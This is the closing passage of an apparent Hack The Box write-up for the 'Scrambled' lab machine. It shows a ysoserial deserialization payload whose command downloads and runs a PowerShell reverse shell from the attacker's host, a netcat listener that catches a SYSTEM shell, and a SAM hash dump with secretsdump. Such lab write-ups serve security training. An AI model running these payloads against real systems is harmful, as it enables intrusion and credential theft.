└─# cat pencer_shell.ps1 
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8 <SNIP> AAsACAAJABiAHkAdA
```

Back on Windows:

```powershell
PS C:\Users\Downloads\ysoserial-1.34\Release> ./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell.exe Invoke-Command -ScriptBlock {Invoke-Expression(New-Object Net.WebClient).downloadString('http://10.10.14.198/pencer_shell.ps1')}"
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJ<SNIP> SaFVISnZkbWxrWlhJK0N3PT0L
```

Now back to Kali and start a web server so we can pull the pencer_shell.ps1 file across to the box:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# python3 -m http.server 80                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In another terminal start netcat listening:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -nlvp 1337
listening on [any] 1337 ...
```

In another terminal connect to the sales app and send our payload:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -v scrm.local 4411
scrm.local [10.10.11.168] 4411 (?) open
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2Vj <SNIP> VhSaFVISnZkbWxrWlhJK0N3PT0L
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.
```

## Shell As Administrator

Switch back to our netcat to see we're connected as NT SYSTEM:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.168] 57419
whoami
nt authority\system
PS C:\Windows\system32> 
```

## Root Flag

Grab the root flag to finish the box:

```powershell
PS C:\Windows\system32> type c:\users\administrator\desktop\root.txt
7968cb704022fe52d68181ce56e77ade
```

Grab the hashes for extra fun using SecretsDump:

```sh
┌──(root㉿kali)-[~/htb/scrambled]
└─# impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x33d8cbadba9e3f89bd60e5bfe64743e3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ebb16eb3b0b1d0bea029cab7d18e534c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

I enjoyed this box. It gave plenty of opportunities to use our investigation skills. Playing with Impacket and Kerberos is always fun too.

Another box done. See you next time.
